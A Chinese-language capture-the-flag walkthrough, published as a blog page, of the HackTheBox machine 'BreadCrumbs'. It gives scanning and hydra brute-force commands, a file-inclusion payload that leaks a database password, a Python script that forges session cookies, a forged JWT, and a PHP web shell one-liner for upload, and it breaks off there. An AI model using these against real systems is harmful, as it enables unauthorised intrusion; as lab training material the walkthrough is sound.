@@ -1,0 +1,903 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="0xptS3">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="BreadCrumbs主机发现12345610.10.10.228sudo masscan -p1-65535 10.10.10.228 --rate&#x3D;1000 -e tun0 &gt; portsports&#x3D;$(cat ports | awk -F &quot; &quot; &#x27;&#123;print $4&#125;&#x27; | awk -F &quot;&#x2F;&quot; &amp;#x2">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BreadCrumbs">
+<meta property="og:url" content="http://example.com/2025/01/22/BreadCrumbs/index.html">
+<meta property="og:site_name" content="0xptS3">
+<meta property="og:description" content="BreadCrumbs主机发现12345610.10.10.228sudo masscan -p1-65535 10.10.10.228 --rate&#x3D;1000 -e tun0 &gt; portsports&#x3D;$(cat ports | awk -F &quot; &quot; &#x27;&#123;print $4&#125;&#x27; | awk -F &quot;&#x2F;&quot; &amp;#x2">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/imgs/image-20250121140815112.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250121140855597.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250121141213620.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250121141219657.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250121141240156.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250121141247519.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250121141518395.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250121141938932.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250121142350269.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250121142709761.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250121165743592.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250121165753829.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250121165827128.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250121170337990.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250121170345914.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250121170434531.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250121170620736.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250121170715466.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250121171233097.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250121171259224.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250121171933668.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250121171943334.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250121171916984.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250121173453576.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250121174038916.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250121174837333.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250121174856059.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250122093705538.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250122093746020.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250122093921267.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250122093936544.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250122100000394.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250122100009574.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250122100144249.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250122100149192.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250122102511975.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250122102517095.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250122103120205.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250122110003208.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250122111656177.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250122112820839.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250122112811375.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250122113243303.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250122113451240.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250122113737875.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250122114112877.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250122114127241.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250122114139751.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250122120003001.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250122121930368.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250122143121369.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250122144129050.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250122144254931.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250122144437895.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250122144600263.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250122144901702.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250122155837928.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250122155826449.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250122160147262.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250122160932168.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250122161207214.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250122161838169.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250122162040579.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250122162148511.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250122171002815.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250122171028056.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250122171047195.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250122182335079.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250122182744918.png">
+<meta property="article:published_time" content="2025-01-22T10:29:52.000Z">
+<meta property="article:modified_time" content="2025-01-22T10:31:24.947Z">
+<meta property="article:author" content="0xptS3">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/imgs/image-20250121140815112.png">
+  
+  
+  
+  <title>BreadCrumbs - 0xptS3</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>0xptS3&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="BreadCrumbs"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-01-22 18:29" pubdate>
+          2025年1月22日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          11 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">BreadCrumbs</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="BreadCrumbs"><a href="#BreadCrumbs" class="headerlink" title="BreadCrumbs"></a>BreadCrumbs</h2><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">228</span><br><span class="hljs-attribute">sudo</span> masscan -p1-<span class="hljs-number">65535</span> <span class="hljs-number">10.10.10.228</span> --rate=<span class="hljs-number">1000</span> -e tun0 &gt; ports<br><span class="hljs-attribute">ports</span>=$(cat ports | awk -F <span class="hljs-string">&quot; &quot;</span> &#x27;&#123;print $<span class="hljs-number">4</span>&#125;&#x27; | awk -F <span class="hljs-string">&quot;/&quot;</span> &#x27;&#123;print $<span class="hljs-number">1</span>&#125;&#x27; | sort -n | tr &#x27;\n&#x27; &#x27;,&#x27; | sed &#x27;s/,$//&#x27;)<br><span class="hljs-attribute">nmap</span> -Pn -sV -sC -p$ports <span class="hljs-number">10.10.10.228</span><br><span class="hljs-attribute">nmap</span> <span class="hljs-number">10.10.10.228</span> --script=vuln<br><span class="hljs-attribute">nmap</span> <span class="hljs-number">10.10.10.228</span> -sU --top-ports <span class="hljs-number">20</span> -Pn<br></code></pre></td></tr></table></figure>
+
+<p><img src="/../imgs/image-20250121140815112.png" srcset="/img/loading.gif" lazyload alt="image-20250121140815112"></p>
+<h3 id="smb-rpc服务初探"><a href="#smb-rpc服务初探" class="headerlink" title="smb&#x2F;rpc服务初探"></a>smb&#x2F;rpc服务初探</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">smblcinet</span> -L //<span class="hljs-number">10.10.10.228</span>/<br></code></pre></td></tr></table></figure>
+
+<p><img src="/../imgs/image-20250121140855597.png" srcset="/img/loading.gif" lazyload alt="image-20250121140855597"></p>
+<h3 id="web服务探索"><a href="#web服务探索" class="headerlink" title="web服务探索"></a>web服务探索</h3><p><img src="/../imgs/image-20250121141213620.png" srcset="/img/loading.gif" lazyload alt="image-20250121141213620"></p>
+<p><img src="/../imgs/image-20250121141219657.png" srcset="/img/loading.gif" lazyload alt="image-20250121141219657"></p>
+<p><img src="/../imgs/image-20250121141240156.png" srcset="/img/loading.gif" lazyload alt="image-20250121141240156"></p>
+<p><img src="/../imgs/image-20250121141247519.png" srcset="/img/loading.gif" lazyload alt="image-20250121141247519"></p>
+<p>尝试爆破下</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">Alex<br>Emma<br><span class="hljs-keyword">Jack</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">John</span><br><span class="hljs-keyword"></span>Lucas<br>Olivia<br>Paul<br></code></pre></td></tr></table></figure>
+
+<p>还有种方法就是注册进去看User Mamager,用户更全</p>
+<p><img src="/../imgs/image-20250121141518395.png" srcset="/img/loading.gif" lazyload alt="image-20250121141518395"></p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">alex<br>paul<br><span class="hljs-keyword">jack</span><br><span class="hljs-keyword"></span>olivia<br><span class="hljs-keyword">john</span><br><span class="hljs-keyword"></span>emma<br>william<br>lucas<br>sirine<br><span class="hljs-keyword">juliette</span><br><span class="hljs-keyword"></span>support<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">hydra <span class="hljs-number">10.10</span>.<span class="hljs-number">10.228</span> http-post-form <span class="hljs-string">&quot;/portal/login.php:username=^USER^&amp;password=^PASS^&amp;method=0:Username or Password incorrect&quot;</span> -L <span class="hljs-keyword">user</span> <span class="hljs-title">-P</span> /usr/share/wordlists/rockyou.txt<br></code></pre></td></tr></table></figure>
+
+<p>与此同时进行mysql的爆破</p>
+<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">hydra <span class="hljs-number">10.10</span>.<span class="hljs-number">10.228</span> -L <span class="hljs-keyword">user</span> <span class="hljs-title">-P</span> /usr/share/wordlists/rockyou.txt mysql<br></code></pre></td></tr></table></figure>
+
+<p><img src="/../imgs/image-20250121141938932.png" srcset="/img/loading.gif" lazyload alt="image-20250121141938932"></p>
+<p>不允许连接</p>
+<p><img src="/../imgs/image-20250121142350269.png" srcset="/img/loading.gif" lazyload alt="image-20250121142350269"></p>
+<p>尝试sql注入</p>
+<p><img src="/../imgs/image-20250121142709761.png" srcset="/img/loading.gif" lazyload alt="image-20250121142709761"></p>
+<p>这里可以看到书籍,然后当我搜索是书籍时，发现了如下</p>
+<p><img src="/../imgs/image-20250121165743592.png" srcset="/img/loading.gif" lazyload alt="image-20250121165743592"></p>
+<p><img src="/../imgs/image-20250121165753829.png" srcset="/img/loading.gif" lazyload alt="image-20250121165753829"></p>
+<p>这也许意味着我可以read files</p>
+<p><img src="/../imgs/image-20250121165827128.png" srcset="/img/loading.gif" lazyload alt="image-20250121165827128"></p>
+<p>成功！现在我们希望读取敏感文件了</p>
+<p><img src="/../imgs/image-20250121170337990.png" srcset="/img/loading.gif" lazyload alt="image-20250121170337990"></p>
+<p><img src="/../imgs/image-20250121170345914.png" srcset="/img/loading.gif" lazyload alt="image-20250121170345914"></p>
+<p>读一下</p>
+<p><img src="/../imgs/image-20250121170434531.png" srcset="/img/loading.gif" lazyload alt="image-20250121170434531"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$host</span> = <span class="hljs-string">&quot;localhost&quot;</span>;<br><span class="hljs-variable">$port</span> = <span class="hljs-number">3306</span>;<br><span class="hljs-variable">$user</span> = <span class="hljs-string">&quot;bread&quot;</span>;<br><span class="hljs-variable">$password</span> = <span class="hljs-string">&quot;jUli901&quot;</span>;<br><span class="hljs-variable">$dbname</span> = <span class="hljs-string">&quot;bread&quot;</span>;<br><br><span class="hljs-comment">// 创建数据库连接</span><br><span class="hljs-variable">$con</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">mysqli</span>(<span class="hljs-variable">$host</span>, <span class="hljs-variable">$user</span>, <span class="hljs-variable">$password</span>, <span class="hljs-variable">$dbname</span>, <span class="hljs-variable">$port</span>);<br><br><span class="hljs-comment">// 检查连接是否成功</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$con</span>-&gt;connect_error) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Could not connect to the database server: &#x27;</span> . <span class="hljs-variable">$con</span>-&gt;connect_error);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>之前是不允许访问mysql，我们访问ssh看看</p>
+<p><img src="/../imgs/image-20250121170620736.png" srcset="/img/loading.gif" lazyload alt="image-20250121170620736"></p>
+<p>失败</p>
+<p><img src="/../imgs/image-20250121170715466.png" srcset="/img/loading.gif" lazyload alt="image-20250121170715466"></p>
+<p>失败，继续文件包含看看，看登录功能php</p>
+<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">book=../portal/authController.php&amp;<span class="hljs-keyword">method</span>=1<br></code></pre></td></tr></table></figure>
+
+<p><img src="/../imgs/image-20250121171233097.png" srcset="/img/loading.gif" lazyload alt="image-20250121171233097"></p>
+<p>做了预处理不能注入<img src="/../imgs/image-20250121171259224.png" srcset="/img/loading.gif" lazyload alt="image-20250121171259224"></p>
+<p>但也许可以伪造jwt</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">6</span>cb<span class="hljs-number">9</span><span class="hljs-keyword">c</span><span class="hljs-number">1</span>a<span class="hljs-number">2786</span>a<span class="hljs-number">483</span>ca<span class="hljs-number">5e44571</span>dcc<span class="hljs-number">5</span>f<span class="hljs-number">3</span>bfa<span class="hljs-number">298593</span>a<span class="hljs-number">6376</span>ad<span class="hljs-number">92185</span><span class="hljs-keyword">c</span><span class="hljs-number">3258</span>acd<span class="hljs-number">5591</span>e<br></code></pre></td></tr></table></figure>
+
+<p>拿着原本的jwt去改造，改成alex</p>
+<p><img src="/../imgs/image-20250121171933668.png" srcset="/img/loading.gif" lazyload alt="image-20250121171933668"></p>
+<p><img src="/../imgs/image-20250121171943334.png" srcset="/img/loading.gif" lazyload alt="image-20250121171943334"></p>
+<p>访问这个</p>
+<p><img src="/../imgs/image-20250121171916984.png" srcset="/img/loading.gif" lazyload alt="image-20250121171916984"></p>
+<p>可以上传文件，我们包含下这个files.php看看内容</p>
+<p><img src="/../imgs/image-20250121173453576.png" srcset="/img/loading.gif" lazyload alt="image-20250121173453576"></p>
+<p>好好好</p>
+<p><img src="/../imgs/image-20250121174038916.png" srcset="/img/loading.gif" lazyload alt="image-20250121174038916"></p>
+<p>研究下cookie.php</p>
+<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">book=../portal/cookie.php&amp;<span class="hljs-keyword">method</span>=1<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Generates a session cookie for the given username.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> string $username Username requesting session cookie</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span> string $session_cookie Returns the generated cookie</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * <span class="hljs-doctag">@devteam</span></span><br><span class="hljs-comment"> * Please DO NOT use default PHPSESSID; our security team says they are predictable.</span><br><span class="hljs-comment"> * CHANGE SECOND PART OF MD5 KEY EVERY WEEK</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">makesession</span>(<span class="hljs-params"><span class="hljs-variable">$username</span></span>) </span>&#123;<br>    <span class="hljs-variable">$max</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$username</span>) - <span class="hljs-number">1</span>; <span class="hljs-comment">// 用户名长度-1</span><br>    <span class="hljs-variable">$seed</span> = <span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">0</span>, <span class="hljs-variable">$max</span>); <span class="hljs-comment">// 生成随机索引</span><br>    <span class="hljs-variable">$key</span> = <span class="hljs-string">&quot;s4lTy_stR1nG_&quot;</span> . <span class="hljs-variable">$username</span>[<span class="hljs-variable">$seed</span>] . <span class="hljs-string">&quot;(!528./9890&quot;</span>; <span class="hljs-comment">// 构建密钥</span><br><br>    <span class="hljs-variable">$session_cookie</span> = <span class="hljs-variable">$username</span> . <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$key</span>); <span class="hljs-comment">// 生成会话 cookie</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$session_cookie</span>; <span class="hljs-comment">// 返回生成的 cookie</span><br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>可以伪造cookie</p>
+<p><img src="/../imgs/image-20250121174837333.png" srcset="/img/loading.gif" lazyload alt="image-20250121174837333"></p>
+<p><img src="/../imgs/image-20250121174856059.png" srcset="/img/loading.gif" lazyload alt="image-20250121174856059"></p>
+<p>伪造paul,我们生成key进行爆破</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><br>name = <span class="hljs-string">&quot;paul&quot;</span><br>listkey = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(name)):<br>    i = i<br>    key = <span class="hljs-string">&quot;s4lTy_stR1nG_&quot;</span> + name[i] + <span class="hljs-string">&quot;(!528./9890&quot;</span><br>    md5hash = hashlib.md5()<br>    md5hash.update(key.encode(<span class="hljs-string">&quot;utf-8&quot;</span>))<br>    listkey.append(name + md5hash.hexdigest())<br><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> listkey:<br>    <span class="hljs-built_in">print</span>(j)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">paula2a6a014d3bee04d7df8d5837d62e8c5</span><br><span class="hljs-string">paul61ff9d4aaefe6bdf45681678ba89ff9d</span><br><span class="hljs-string">paul8c8808867b53c49777fe5559164708c3</span><br><span class="hljs-string">paul47200b180ccd6835d25d034eeb6e6390</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/../imgs/image-20250122093705538.png" srcset="/img/loading.gif" lazyload alt="image-20250122093705538"></p>
+<p>第四个成功了</p>
+<p><img src="/../imgs/image-20250122093746020.png" srcset="/img/loading.gif" lazyload alt="image-20250122093746020"></p>
+<p>尝试 上传文件</p>
+<p><img src="/../imgs/image-20250122093921267.png" srcset="/img/loading.gif" lazyload alt="image-20250122093921267"></p>
+<p>伪造jwt</p>
+<p><img src="/../imgs/image-20250122093936544.png" srcset="/img/loading.gif" lazyload alt="image-20250122093936544"></p>
+<p>伪造paul</p>
+<p><img src="/../imgs/image-20250122100000394.png" srcset="/img/loading.gif" lazyload alt="image-20250122100000394"></p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Cookie: <span class="hljs-attribute">PHPSESSID</span>=paul47200b180ccd6835d25d034eeb6e6390; <span class="hljs-attribute">token</span>=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7InVzZXJuYW1lIjoicGF1bCJ9fQ.7pc5S1P76YsrWhi_gu23bzYLYWxqORkr0WtEz_IUtCU<br></code></pre></td></tr></table></figure>
+
+<p><img src="/../imgs/image-20250122100009574.png" srcset="/img/loading.gif" lazyload alt="image-20250122100009574"></p>
+<p>php也可以上传，我们传shell</p>
+<p><img src="/../imgs/image-20250122100144249.png" srcset="/img/loading.gif" lazyload alt="image-20250122100144249"></p>
+<p><img src="/../imgs/image-20250122100149192.png" srcset="/img/loading.gif" lazyload alt="image-20250122100149192"></p>
+<p>想办法绕过报错，有可能是因为windows检测恶意文件了</p>
+<p><img src="/../imgs/image-20250122102511975.png" srcset="/img/loading.gif" lazyload alt="image-20250122102511975"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span>(`<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]`);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
